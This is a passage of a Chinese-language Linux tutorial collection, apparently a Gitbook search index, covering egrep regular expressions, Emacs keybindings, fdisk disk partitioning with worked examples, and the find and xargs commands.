匹配邮箱地址格式：用户名与域名之间以 @ 分隔 用户名不少于3个字符，可能由字母、下划线、句点 . 、数字组成 域名应至少有一个 . 分隔，分隔的各部分至少2个字符，可能由字母、减号、数字组成 [0-9a-zA-Z_.]{3,}@[0-9a-zA-Z.-]{2,}(\\.[0-9a-zA-Z-]{2,})+ egrep '[0-9a-zA-Z_.]{3,}@\\ [0-9a-zA-Z.-]{2,}(\\.[0-9a-zA-Z-]{2,})+' mailadd.txt #匹配有效邮箱地址 匹配主机名格式：由 . 分隔，至少包括3组字符串 每组字符串不少于2个字符，可能由字母、减号、数字、下划线组成 主机名后必须是单词边界，主机名前不能有@符号 ^[^@][0-9a-zA-Z_-]{2,}(\\.[0-9a-zA-Z_-]{2,}){2,}\\> egrep '^[^@][0-9a-zA-Z_-]{2,}(\\.[0-9a-zA-Z_-]{2,}){2,}\\>' mailadd.txt #匹配有效主机名 匹配IP地址 以 . 分隔，一共由四组十进制数构成 每组数值的范围为0-255，字符宽度为1-3位 前后必须是单词边界 \\ ifconfig | egrep '\\ Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:44:22 "},"Linux-Command/Linux_Command_emacs.html":{"url":"Linux-Command/Linux_Command_emacs.html","title":"Linux Command Emacs","keywords":"","body":"Linux Command emacs 文本编辑器1 基本命令2 编辑3 移动光标4 Buffer 相关5 拷贝与粘贴6 窗口操作7 搜索和替换8 Tags9 书签10 帮助11 其它Linux Command emacs 文本编辑器 tagsstart 编辑器 tagsstop 1 基本命令 C-x C-c : 退出Emacs C-x C-f : 打开一个文件，如果文件不存在，则创建一个文件 C-g : 取消未完成的命令 2 编辑 C-z (redefined): Undo；原来C-z是挂起Emacs（然后用fg命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo M-d : 删除光标后的词语 3 移动光标 C-v : 向前翻页 M-v : 向后翻页 M-r : 将光标移动到屏幕中间那行 C-a : 移到行首 M-a : 移到句首，从行首到句首之间可能有空格 C-e : 移到行尾 M-e : 移到句尾 M-{ : 向上移动一段 M-} : 向下移动一段 C-right : 向前移动一个单词 C-left : 向后移动一个单词 C-up : 向前移动一段 C-down : 向后移动一段 M- : 移到整个文本末尾 C-u 数字 命令 : 执行多次(数字表示次数)该命令；\"M-数字 命令\" 也可以 M-x goto-line : 移动到某一行 C-l : 重绘屏幕，效果就是当前编辑行移动窗口中央 4 Buffer 相关 C-x k : 关闭当前buffer C-x b : 切换到前一个编辑的buffer C-x C-b : 列出当前所有buffer C-x C-s : 保存当前buffer C-x s : 保存所有未保存的buffer，会提示你是否需要保存 C-x C-w : 文件另存为 5 拷贝与粘贴 M-space (redefined): 设置mark; C-@ 是默认命令 C-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行 M-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行 C-k : 从当前位置剪切到行尾 C-y : 粘贴 M-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。 C-x r k : 执行矩形区域的剪切 C-x r y : 执行矩形区域的粘贴 6 窗口操作 C-x 0 : 关闭当前窗口 C-x 1 : 将当前窗口最大化 C-x 2 : 垂直分割窗口 C-x 3 : 水平分割窗口 M-o (redefined) : 在窗口之间切换; C-x o 是默认命令 C-x 5 1/2/3/0 : 对frame类似的操作 C-x : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用） (C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行 (C-u) C-x } : 加宽当前窗口 (C-u) C-x { : 压窄当前窗口 ESC C-v : 在其它窗口进行卷屏操作 7 搜索和替换 C-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标 C-s RET : 普通搜索 C-r : 向前搜索 C-s RET C-w : 按单词查询 M-% : 查询替换，也就是替换前会询问一下 M-x replace-string : 普通替换 8 Tags M-! etags .c .h : 创建TAGS文件 M-. : 跳到tag所在位置 M-x list-tags : 列出tags 9 书签 C-x r m : 设置书签bookmark C-x r b : 跳到bookmark处 10 帮助 C-h ? : 查看帮助信息 C-h f : 查看一个函数 C-h v : 查看一个变量 C-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略) C-h C-f : 查看一个函数的info，非常有用 C-h i : 看Info 11 其它 C-M-\\ : 对选中区域，按照某种格式(比如C程序)进行格式化 C-x h : 全部选中 M-! : 执行外部shell命令 M-x shell : 模拟shell的buffer M-x term : 模拟terminal, C-c k 关闭terminal C-x C-q : 修改buffer的只读属性 参考： GNU Emacs——An extensible, customizable, free/libre text editor How To Use the Emacs Editor in Linux emacs command in Linux with examples Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:47:10 "},"Linux-Command/Linux_Command_fdisk.html":{"url":"Linux-Command/Linux_Command_fdisk.html","title":"Linux Command Fdisk","keywords":"","body":"Linux Command fdisk1. 简介2. fdisk -l 查看磁盘分区2.1 fdisk -l 数值说明2.2 估算存储设备是否被完全划分3. fdisk -s 检查分区的大小4. fdisk 对硬盘及分区操作4.1 fdisk 说明4.2 p 列出当前操作硬盘的分区情况用4.3 d 指令来删除一个分区4.4 n 指令增加一个分区4.5 t 指令指定分区类型4.6 q 或 w 退出5. 添加分区6. 刷新分区表7. 查看文件系统类型8. 对分区格式化与挂载9. 自动化挂载10. 修复分区表顺序Linux Command fdisk tagsstart lvm tagsstop 图 1.2.25.1：在这里插入图片描述 1. 简介 fdisk 代表（用于“固定磁盘或格式化磁盘”）是Linux/Unix系统中最常用的基于命令行的磁盘操作实用程序。借助 fdisk 命令，您可以使用其自己的用户友好的基于文本的菜单驱动界面查看、创建、调整大小、删除、更改、复制和移动硬盘驱动器上的分区。 该工具在为新分区创建空间、为新驱动器组织空间、重新组织旧驱动器以及将数据复制或移动到新磁盘方面非常有用。它允许您根据系统中硬盘的大小创建最多四个新的主分区和逻辑（扩展）分区的数量。 2. fdisk -l 查看磁盘分区 $ fdisk -l 　　以下是表示第一块硬盘 hda 　　Disk /dev/hda: 80.0 GB, 80026361856 bytes 　　255 heads, 63 sectors/track, 9729 cylinders 　　Units = cylinders of 16065 * 512 = 8225280 bytes 　　Device Boot Start End Blocks Id System 　　/dev/hda1 * 1 765 6144831 7 HPFS/NTFS 主分区 　　/dev/hda2 766 2805 16386300 c W95 FAT32 (LBA) 主分区 　　/dev/hda3 2806 9729 55617030 5 Extended 扩展分区 　　/dev/hda5 2806 3825 8193118+ 83 Linux 逻辑分区 　　/dev/hda6 3826 5100 10241406 83 Linux 逻辑分区 　　/dev/hda7 5101 5198 787153+ 82 Linux swap / Solaris 逻辑分区 　　/dev/hda8 5199 6657 11719386 83 Linux 逻辑分区 　　/dev/hda9 6658 7751 8787523+ 83 Linux 逻辑分区 　　/dev/hda10 7752 9729 15888253+ 83 Linux 逻辑分区 　　以下是表示第二块硬盘sda 　　Disk /dev/sda: 1035 MB, 1035730944 bytes 　　256 heads, 63 sectors/track, 125 cylinders 　　Units = cylinders of 16128 * 512 = 8257536 bytes 　　Device Boot Start End Blocks Id System 　　/dev/sda1 1 25 201568+ c W95 FAT32 (LBA) 主分区 　　/dev/sda2 26 125 806400 5 Extended 扩展分区 　　/dev/sda5 26 50 201568+ 83 Linux 　　/dev/sda6 51 76 200781 83 Linux 通过上面的信息，我们知道此机器中挂载两个硬盘（或移动硬盘），其中一个是hda 另一个是sda ；如果我们想查看单个硬盘情况，可以通过 fdisk -l /dev/hda1 或者fdisk -l /dev/sda1 来操作；以fdisk -l 输出的硬盘标识为准； 　 其中 hda有三个主分区（包括扩展分区），分别是主分区 hda1 hda2 和hda3（扩展分区） ；逻辑分区是 hda5到hda10； 其中 sda 有两个主分区（包括扩展分区），分别是 hda1 和hda2 （扩展分区）；逻辑分区是 sda5 hda6 ； 硬盘总容量=主分区（包括扩展分区）总容量 扩展分区容量=逻辑分区总容量 通过上面的例子，我们可以得知 hda=hda1+hda2+hda3，其中hda3=hda5+hda6+hda7+hda8+hda9+hda10 …… …… 2.1 fdisk -l 数值说明 Disk /dev/hda: 80.0 GB, 80026361856 bytes 　　255 heads, 63 sectors/track, 9729 cylinders 　　Units = cylinders of 16065 * 512 = 8225280 bytes 　　这个硬盘是80G的，有255个磁面；63个扇区；9729个磁柱；每个 cylinder（磁柱）的容量是 8225280 bytes=8225.280 K（约为）=8.225280M（约为）；分区序列 引导 开始 终止 容量 分区类型ID 分区类型 　　Device Boot Start End Blocks Id System 　　/dev/hda1 * 1 765 6144831 7 HPFS/NTFS 　　/dev/hda2 766 2805 16386300 c W95 FAT32 (LBA) 　　/dev/hda3 2806 9729 55617030 5 Extended 　　/dev/hda5 2806 3825 8193118+ 83 Linux 　　/dev/hda6 3826 5100 10241406 83 Linux 　　/dev/hda7 5101 5198 787153+ 82 Linux swap / Solaris 　　/dev/hda8 5199 6657 11719386 83 Linux 　　/dev/hda9 6658 7751 8787523+ 83 Linux 　　/dev/hda10 7752 9729 15888253+ 83 Linux 说明： 硬盘分区的表示：在Linux 是通过hdx 或 sdx 表示的，其中 * 表示的是a、b、c …… …… x表示的数字 1、2、3 …… …… hd大多是IDE硬盘；sd大多是SCSI或移动存储； 引导（Boot）：表示引导分区，在上面的例子中 hda1 是引导分区； Start （开始）：表示的一个分区从X cylinder（磁柱）开始； End （结束）：表示一个分区到 Y cylinder（磁柱）结束； 　id和System 表示的是一个意思，id看起来不太直观，我们要在fdisk 一个分区时，通过指定id来确认分区类型；比如 7表示的就NTFS 分区；这个在fdisk 中要通过t功能来指定。下面的部份会提到； Blocks（容量）：这是我翻译的，其实不准确，表示的意思的确是容量的意思，其单位是K；一个分区容量的值是由下面的公式而来的； 　　 Blocks = （相应分区End数值 - 相应分区Start数值）x 单位cylinder（磁柱）的容量 所以我们算一下 hda1的 Blocks 的大小 ： 　　hda1 Blocks=（765-1）x8225.280=6284113.92 K = 6284.113.92M 　　 注：换算单位以硬盘厂家提供的10进位算起，如果以操作系统二进制来算，这个分区容量应该更少一些，得出的这个值和我们通过 fdisk -l 看到的 /dev/hda1的值是大体相当的，因为换算方法不一样，所以也不可能尽可能的精确；再加上分区时的一点损失之类，有时或大或小是存在的； 2.2 估算存储设备是否被完全划分 我们估算一个硬盘是否完全被划分，我们只要看 fdisk -l 输出的内容中的 cylinders（柱体） 上一个分区的End 和下一个分区的Start是不是一个连续的数字，另外要看一下每个硬盘设备的fdisk -l 的开头部份，看一下他的cylinders（柱体）的值；比如hda设备，我们看到的是 9729 cylinders ；我们通过hda的分区表可以看到上一个分区的End的值+1 就是下一个分区的Start 的值；比如 hda2的Start的值是 hda1的End 的值+1，这证明 hda1 和hda2 中间没有空白分区，是连续的，以此类推；在 hda10，我们看到 End的值是9729 ，而在fdisk -l头部信息中也有9729 cylinders，证明这个硬盘已经完全划分； Disk /dev/sda: 1035 MB, 1035730944 bytes 256 heads, 63 sectors/track, 125 cylinders Units = cylinders of 16128 * 512 = 8257536 bytes DeviceBoot Start End Blocks Id System /dev/sda1 1 25 201568+ c W95FAT32 (LBA) /dev/sda2 26 125 806400 5 Extended /dev/sda5 26 50 201568+ 83 Linux /dev/sda6 51 76 200781 83 Linux 我们再看看 sda 移动储是不是被完全划分了；sda有 125个cylinders（柱体），有一个主分区和一个扩展分区构成；在扩展分区中，我们看到End的值为125,而这个移动硬盘的cylinder也是125，这能说明这个硬盘不可能再添加任何主分区了；根据我们上面所说的sda1 sda2 sda5 sda6 之间未有任何未划分空间，但sda6 的cylinders （柱体）的End值却是 76 ，而sda总的cylinders （柱体）有125个，由此看来sda 在 sda6后面有未划分区域；至于sda有多少未划分空间，我们算一下就知道了；扩展分区总容量是 806400 K ，大约是 806.400M左右，而逻辑分区 sda5和sda6 的大小加起来是 400M左右，所以还仍有400M左右未划分空间，并且只能划分为链逻辑分区。 3. fdisk -s 检查分区的大小 格式化新分区后，使用fdisk 命令使用标志“ s ”（以块为单位显示大小）检查该分区的大小。这样您就可以检查任何特定设备的大小。 $ fdisk -s /dev/sda2 5194304 4. fdisk 对硬盘及分区操作 通过 fdisk -l 得知 /dev/hda 或者/dev/sda设备；我们如果想再添加或者删除一些分区，可以执行： $ fdisk /dev/hda $ fdisk /dev/sda 4.1 fdisk 说明 $ fdisk /dev/sda Command (m for help): 在这里按m ，就会输出帮助； Command action a toggle a bootable flag b edit bsd disklabel c toggle the dos compatibilityflag d delete apartition 注：这是删除一个分区的动作； l list known partitiontypes 注：l是列出分区类型，以供我们设置相应分区的类型； m print thismenu 注：m 是列出帮助信息； n add a new partition注：添加一个分区； o create a new empty DOSpartition table p print the partition table注：p列出分区表； q quit without saving changes注：不保存退出； s create a new empty Sundisklabel t change a partition's systemid 注：t 改变分区类型； u change display/entryunits v verify the partitiontable w write table to disk andexit 注：把分区表写入硬盘并退出； x extra functionality (expertsonly) 注：扩展应用，专家功能； 常用：d l m p q t w 4.2 p 列出当前操作硬盘的分区情况用 Command (m for help): p Disk /dev/sda: 1035 MB, 1035730944 bytes 256 heads, 63 sectors/track, 125 cylinders Units = cylinders of 16128 * 512 = 8257536 bytes DeviceBoot Start End Blocks Id System /dev/sda1 1 25 201568+ c W95FAT32 (LBA) /dev/sda2 26 125 806400 5 Extended /dev/sda5 26 50 201568+ 83 Linux /dev/sda6 51 76 200781 83 Linux 4.3 d 指令来删除一个分区 Command (m for help):p 注：列出分区情况； Disk /dev/sda: 1035 MB, 1035730944 bytes 256 heads, 63 sectors/track, 125 cylinders Units = cylinders of 16128 * 512 = 8257536 bytes DeviceBoot Start End Blocks Id System /dev/sda1 1 25 201568+ c W95FAT32 (LBA) /dev/sda2 26 125 806400 5 Extended /dev/sda5 26 50 201568+ 83 Linux /dev/sda6 51 76 200781 83 Linux Command (m for help): d 注：执行删除分区指定； Partition number (1-6): 6 注：我想删除 sda6 ，就在这里输入 6； Command (m for help): p 注：再查看一下硬盘分区情况，看是否删除了？ Disk /dev/sda: 1035 MB, 1035730944 bytes 256 heads, 63 sectors/track, 125 cylinders Units = cylinders of 16128 * 512 = 8257536 bytes DeviceBoot Start End Blocks Id System /dev/sda1 1 25 201568+ c W95FAT32 (LBA) /dev/sda2 26 125 806400 5 Extended /dev/sda5 26 50 201568+ 83 Linux Command (m for help): 警告：删除分区时要小心，请看好分区的序号，如果您删除了扩展分区，扩展分区之下的逻辑分区都会删除；所以操作时一定要小心；如果知道自己操作错了，请不要惊慌，用q不保存退出；切记切记！！！！在分区操作错了之时，千万不要输入w保存退出！！！ 4.4 n 指令增加一个分区 Command (m for help): p Disk /dev/sda: 1035 MB, 1035730944 bytes 256 heads, 63 sectors/track, 125 cylinders Units = cylinders of 16128 * 512 = 8257536 bytes DeviceBoot Start End Blocks Id System /dev/sda1 1 25 201568+ c W95FAT32 (LBA) /dev/sda2 26 125 806400 5 Extended /dev/sda5 26 50 201568+ 83 Linux Command (m for help): n 注：增加一个分区； Command action l logical (5 orover) 注：增加逻辑分区，分区编号要大于5；为什么要大于5，因为已经有sda5了； p primary partition (1-4)注：增加一个主分区；编号从 1-4 ；但sda1 和sda2都被占用，所以只能从3开始； p Partition number (1-4): 3 No free sectors available 注：失败中，为什么失败？ 我试图增加一个主分区，看来是失败了，为什么失败？因为我们看到主分区+扩展分区把整个磁盘都用光了，看扩展分区的End的值，再看一下p输出信息中有125 cylinders；最好还是看前面部份；那里有提到；所以我们只能增加逻辑分区了； Command (m for help): n Command action l logical (5 or over) p primary partition (1-4) l 注：在这里输入l，就进入划分逻辑分区阶段了； First cylinder (51-125, default51): 注：这个就是分区的Start值；这里最好直接按回车，如果您输入了一个非默认的数字，会造成空间浪费； Using default value 51 Last cylinder or +size or +sizeM or +sizeK (51-125, default 125):+200M 注：这个是定义分区大小的，+200M 就是大小为200M；当然您也可以根据p提示的单位cylinder的大小来算，然后来指定End的数值。回头看看是怎么算的；还是用+200M这个办法来添加，这样能直观一点。如果您想添加一个10G左右大小的分区，请输入+10000M ； Command (m for help): 4.5 t 指令指定分区类型 Command (m for help): t 注：通过t来指定分区类型； Partition number (1-6): 6 注：要改变哪个分区类型呢？我指定了6，其实也就是sda6 Hex code (type L to list codes):L 注：在这里输入L，就可以查看分区类型的id了； Hex code (type L to list codes): b 注：如果我想让这个分区是W95 FAT32 类型的，通过L查看得知 b是表示的是，所以输入了b； Changed system type of partition 6 to b (W95FAT32) 注：系统信息，改变成功；是否是改变了，请用p查看； Command (m for help): p Disk /dev/sda: 1035 MB, 1035730944 bytes 256 heads, 63 sectors/track, 125 cylinders Units = cylinders of 16128 * 512 = 8257536 bytes DeviceBoot Start End Blocks Id System /dev/sda1 1 25 201568+ c W95FAT32 (LBA) /dev/sda2 26 125 806400 5 Extended /dev/sda5 26 50 201568+ 83 Linux /dev/sda6 51 75 201568+ b W95FAT32 4.6 q 或 w 退出 其中 q是 不保存退出，w是保存退出； Command (m for help): w 或 Command (m for help): q 5. 添加分区 添加两个200M的主分区，其它为扩展分区，在扩展分区中我们添加两个200M大小的逻辑分区； Command (m for help): p 注：列出分区表； Disk /dev/sda: 1035 MB, 1035730944 bytes 256 heads, 63 sectors/track, 125 cylinders Units = cylinders of 16128 * 512 = 8257536 bytes DeviceBoot Start End Blocks Id System Command (m for help): n 注：添加分区； Command action e extended p primary partition (1-4) p 注：添加主分区； Partition number (1-4): 1 注：添加主分区1； First cylinder (1-125, default1): 注：直接回车，主分区1的起始位置；默认为1,默认就好； Using default value 1 Last cylinder or +size or +sizeM or +sizeK (1-125, default 125):+200M 注：指定分区大小，用+200M来指定大小为200M Command (m for help): n 注：添加新分区； Command action e extended p primary partition (1-4) p 注：添加主分区 Partition number (1-4): 2 注：添加主分区2； First cylinder (26-125, default 26): Using default value 26 Last cylinder or +size or +sizeM or +sizeK (26-125, default 125):+200M 注：指定分区大小，用+200M来指定大小为200M Command (m for help): n Command action e extended p primary partition (1-4) e 注：添加扩展分区； Partition number (1-4): 3 注：指定为3，因为主分区已经分了两个了，这个也算主分区，从3开始； First cylinder (51-125, default 51): 注：直接回车； Using default value 51 Last cylinder or +size or +sizeM or +sizeK (51-125, default125): 注：直接回车，把其余的所有空间都给扩展分区； Using default value 125 Command (m for help): p Disk /dev/sda: 1035 MB, 1035730944 bytes 256 heads, 63 sectors/track, 125 cylinders Units = cylinders of 16128 * 512 = 8257536 bytes DeviceBoot Start End Blocks Id System /dev/sda1 1 25 201568+ 83 Linux /dev/sda2 26 50 201600 83 Linux /dev/sda3 51 125 604800 5 Extended Command (m for help): n Command action l logical (5 or over) p primary partition (1-4) l 注：添加逻辑分区； First cylinder (51-125, default 51): Using default value 51 Last cylinder or +size or +sizeM or +sizeK (51-125, default 125):+200M 注：添加一个大小为200M大小的分区； Command (m for help): n Command action l logical (5 or over) p primary partition (1-4) l 注：添加一个逻辑分区； First cylinder (76-125, default 76): Using default value 76 Last cylinder or +size or +sizeM or +sizeK (76-125, default 125):+200M 注：添加一个大小为200M大小的分区； Command (m for help): p 列出分区表； Disk /dev/sda: 1035 MB, 1035730944 bytes 256 heads, 63 sectors/track, 125 cylinders Units = cylinders of 16128 * 512 = 8257536 bytes DeviceBoot Start End Blocks Id System /dev/sda1 1 25 201568+ 83 Linux /dev/sda2 26 50 201600 83 Linux /dev/sda3 51 125 604800 5 Extended /dev/sda5 51 75 201568+ 83 Linux /dev/sda6 76 100 201568+ 83 Linux 6. 刷新分区表 partprobe 7. 查看文件系统类型 $ fdisk -l /dev/sda Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: gpt Disk identifier: E1FFAD5C-DD8B-449C-B206-A51240EDD798 Device Start End Sectors Size Type /dev/sda1 2048 4095 2048 1M BIOS boot /dev/sda2 4096 2101247 2097152 1G Linux filesystem /dev/sda3 2101248 41940991 39839744 19G Linux filesystem $ blkid /dev/sda /dev/sda: PTUUID=\"e1ffad5c-dd8b-449c-b206-a51240edd798\" PTTYPE=\"gpt\" $ blkid /dev/sda1 /dev/sda1: PARTUUID=\"9a165a33-0718-42c7-b5e7-7e2088aac72e\" $ blkid /dev/sda2 /dev/sda2: UUID=\"379ce519-a3c2-46c9-9748-deb5b7845231\" TYPE=\"ext4\" PARTUUID=\"0bc3691b-5ef1-4b9d-bf3d-2174ddbaaab5\" 8. 对分区格式化与挂载 格式化类型： mkfs.bfs mkfs.ext2 mkfs.jfs mkfs.msdos mkfs.vfat mkfs.cramfs mkfs.ext3 mkfs.minix mkfs.reiserfs mkfs.xfs 等命令来格式化分区，比如我想格式化sda6为ext3文件系统，则输入； mkfs.ext3 /dev/sda6 如果我想加载 sda6到目前系统来存取文件，应该有mount 命令，但首先您得建一个挂载目录；比如 /data mkdir /data mount /dev/sda6 /data df -lh 如果卸载 umount /data df -lh 9. 自动化挂载 $ tail -2 /etc/fstab /dev/sdb1 /data1 ext4 defaults 0 0 /dev/sb2 /data2 xfs defaults 0 0 $ mount -a 10. 修复分区表顺序 如果您删除了逻辑分区并再次重新创建它，您可能会注意到“分区乱序”问题或错误消息，例如“分区表条目未按磁盘顺序”。 例如，当三个逻辑分区（如sda4、sda5和sda6）被删除并创建新分区时，您可能期望新分区名称为sda4。但是，系统会将其创建为sda5。发生这种情况的原因是，在删除分区后，sda7分区已被移动为sda4，并且可用空间移至末尾。 要解决此类分区顺序问题，并将sda4分配给新创建的分区，请发出“ x ”进入额外功能部分，然后输入“ f ”专家命令来修复分区表的顺序，如下所示。 $ fdisk /dev/sda WARNING: DOS-compatible mode is deprecated. It's strongly recommended to switch off the mode (command 'c') and change display units to sectors (command 'u'). Command (m for help): x Expert command (m for help): f Done. Expert command (m for help): w The partition table has been altered! Calling ioctl() to re-read partition table. WARNING: Re-reading the partition table failed with error 16: Device or resource busy. The kernel still uses the old table. The new table will be used at the next reboot or after you run partprobe(8) or kpartx(8) Syncing disks. 之后，运行' f '命令，不要忘记运行' w '命令保存并退出fdisk命令模式。一旦它修复了分区表顺序，您将不再收到错误消息。 参考： 10 fdisk Commands to Manage Linux Disk Partitions linux_fdisk命令详解 fdisk(8) — Linux manual page Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-08-18 05:57:30 "},"Linux-Command/Linux_Command_find.html":{"url":"Linux-Command/Linux_Command_find.html","title":"Linux Command Find","keywords":"","body":"Linux Command find 查找匹配1. 格式2. 参数4. 举例4.1 exec4.2 xargsLinux Command find 查找匹配 tagsstart 文件管理 tagsstop 图 1.2.26.1：在这里插入图片描述 1. 格式 find pathname -options [-print -exec -ok ...] 2. 参数 pathname: find命令所查找的目录路径。例如用.来表示当前目录，用/来表示系统根目录。 -print： find命令将匹配的文件输出到标准输出。 -exec： find命令对匹配的文件执行该参数所给出的shell命令。相应命令的形式为'command' { } ;，注意{ }和；之间的空格。 -ok： 和-exec的作用相同，只不过以一种更为安全的模式来执行该参数所给出的shell命令，在执行每一个命令之前，都会给出提示，让用户来确定是否执行。 -name 按照文件名查找文件。 -perm 按照文件权限来查找文件。 -prune 使用这一选项可以使find命令不在当前指定的目录中查找，如果同时使用-depth选项，那么-prune将被find命令忽略。 -user 按照文件属主来查找文件。 -group 按照文件所属的组来查找文件。 -mtime -n +n 按照文件的更改时间来查找文件， - n表示文件更改时间距现在n天以内，+ n表示文件更改时间距现在n天以前。find命令还有-atime和-ctime 选项，但它们都和-m time选项。 -nogroup 查找无有效所属组的文件，即该文件所属的组在/etc/groups中不存在。 -nouser 查找无有效属主的文件，即该文件的属主在/etc/passwd中不存在。 -newer file1 ! file2 查找更改时间比文件file1新但比文件file2旧的文件。 -type 查找某一类型的文件，诸如： b - 块设备文件。 d - 目录。 c - 字符设备文件。 p - 管道文件。 l - 符号链接文件。 f - 普通文件。 -size n：[c] 查找文件长度为n块的文件，带有c时表示文件长度以字节计。-depth：在查找文件时，首先查找当前目录中的文件，然后再在其子目录中查找。 -fstype：查找位于某一类型文件系统中的文件，这些文件系统类型通常可以在配置文件/etc/fstab中找到，该配置文件中包含了本系统中有关文件系统的信息。 -mount：在查找文件时不跨越文件系统mount点。 -follow：如果find命令遇到符号链接文件，就跟踪至链接所指向的文件。 -cpio：对匹配的文件使用cpio命令，将这些文件备份到磁带设备中。 另外,下面三个的区别: -amin n 查找系统中最后N分钟访问的文件 -atime n 查找系统中最后n*24小时访问的文件 -cmin n 查找系统中最后N分钟被改变文件状态的文件 -ctime n 查找系统中最后n*24小时被改变文件状态的文件 -mmin n 查找系统中最后N分钟被改变文件数据的文件 -mtime n 查找系统中最后n*24小时被改变文件数据的文件 4. 举例 find命令将删除当目录中访问时间在7日以来、含有数字后缀的admin.log文件。 该命令只检查三位数字，所以相应文件的后缀不要超过999。先建几个admin.log*的文件 ，才能使用下面这个命令 $ find . -name \"admin.log[0-9][0-9][0-9]\" -atime -7 -ok rm { } ; ? n ? n ? n ? n 查找/var/logs目录中更改时间在7日以前的普通文件，并在删除之前询问它们； $ find /var/logs -type f -mtime +7 -ok rm { } ; 为了查找当前文件系统中的所有目录并排序； $ find . -type d | sort 为了查找系统中所有的rmt磁带设备； $ find /dev/rmt -print 4.1 exec rm命令删除文件之前，先用ls命令看一下，确认它们是所要删除的文件。 $ find . -type f -exec ls -l { } ; -rw-r--r-- 1 root root 34928 2003-02-25 ./conf/httpd.conf -rw-r--r-- 1 root root 12959 2003-02-25 ./conf/magic -rw-r--r-- 1 root root 180 2003-02-25 ./conf.d/README 在/logs目录中查找更改时间在5日以前的文件并删除它们： $ find logs -type f -mtime +5 -exec rm { } ; find命令在当前目录中查找所有文件名以.LOG结尾、更改时间在5日以上的文件，并删除它们，只不过在删除之前先给出提示。 $ find . -name \"*.conf\" -mtime +5 -ok rm { } ; ? n 按y键删除文件，按n键不删除。 在下面的例子中我们使用grep命令。find命令首先匹配所有文件名为“ passwd*”的文件，例如passwd、passwd.old、passwd.bak，然后执行grep命令看看在这些文件中是否存在一个sam用户。 $ find /etc -name \"passwd*\" -exec grep \"sam\" { } ; sam:x:501:501::/usr/sam:/bin/bash $ find $HOME -print $ find ~ -print 让当前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件； $ find . -type f -perm 644 -exec ls -l { } ; 为了查找系统中所有文件长度为0的普通文件，并列出它们的完整路径； $ find / -type f -size 0 -exec ls -l { } ; 为了查找系统中所有属于root组的文件； $find . -group root -exec ls -l { } ; -rw-r--r-- 1 root root 595 10月 31 01:09 ./fie1 4.2 xargs xargs - build and execute command lines from standard input 在使用find命令的-exec选项处理匹配到的文件时， find命令将所有匹配到的文件一起传递给exec执行。但有些系统对能够传递给exec的命令长度有限制，这样在find命令运行几分钟之后，就会出现溢出错误。错误信息通常是“参数列太长”或“参数列溢出”。这就是xargs命令的用处所在，特别是与find命令一起使用。 find命令把匹配到的文件传递给xargs命令，而xargs命令每次只获取一部分文件而不是全部，不像-exec选项那样。这样它可以先处理最先获取的一部分文件，然后是下一批，并如此继续下去。 在有些系统中，使用-exec选项会为处理每一个匹配到的文件而发起一个相应的进程，并非将匹配到的文件全部作为参数一次执行；这样在有些情况下就会出现进程过多，系统性能下降的问题，因而效率不高； 而使用xargs命令则只有一个进程。另外，在使用xargs命令时，究竟是一次获取所有的参数，还是分批取得参数，以及每一次获取参数的数目都会根据该命令的选项及系统内核中相应的可调参数来确定。 来看看xargs命令是如何同find命令一起使用的，并给出一些例子。 下面的例子查找系统中的每一个普通文件，然后使用xargs命令来测试它们分别属于哪类文件 $ find . -type f -print | xargs file ./.kde/Autostart/Autorun.desktop: UTF-8 Unicode English text ./.kde/Autostart/.directory: ISO-8859 text ...... 在整个系统中查找内存信息转储文件(core dump) ，然后把结果保存到/tmp/core.log 文件中： $ find / -name \"core\" -print | xargs echo \"\" >/tmp/core.log 上面这个执行太慢，我改成在当前目录下查找 $ find . -name \"file*\" -print | xargs echo \"\" > /temp/core.log $ cat /temp/core.log ./file6 在当前目录下查找所有用户具有读、写和执行权限的文件，并收回相应的写权限： $ ls -l drwxrwxrwx 2 sam adm 4096 10月 30 20:14 file6 -rwxrwxrwx 2 sam adm 0 10月 31 01:01 http3.conf -rwxrwxrwx 2 sam adm 0 10月 31 01:01 httpd.conf $ find . -perm -7 -print | xargs chmod o-w $ ls -l drwxrwxr-x 2 sam adm 4096 10月 30 20:14 file6 -rwxrwxr-x 2 sam adm 0 10月 31 01:01 http3.conf -rwxrwxr-x 2 sam adm 0 10月 31 01:01 httpd.conf 用grep命令在所有的普通文件中搜索hostname这个词： $ find . -type f -print | xargs grep \"hostname\" ./httpd1.conf:# different IP addresses or hostnames and have them handled by the ./httpd1.conf:# VirtualHost: If you want to maintain multiple domains/hostnames on your 用grep命令在当前目录下的所有普通文件中搜索hostnames这个词： $ find . -name * -type f -print | xargs grep \"hostnames\" ./httpd1.conf:# different IP addresses or hostnames and have them handled by the ./httpd1.conf:# VirtualHost: If you want to maintain multiple domains/hostnames on your 分别使用xargs和exec实现这样的需求，把当前目录下所有后缀名为.txt的文件的权限修改为777 $ find ./ -type f -name \"*.txt\" |xargs chmod 777 $ find ./ -type f -name \"*.txt\" -exec chmod 777 {} ; Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:15:46 "},"Linux-Command/Linux_Command_fio.html":{"url":"Linux-Command/Linux_Command_fio.html","title":"Linux Command Fio","keywords":"","body":"Linux Command fio测试磁盘io工具1. 简介2. 参数3. 示例Linux Command fio测试磁盘io工具 tagsstart 测试 tagsstop 1. 简介 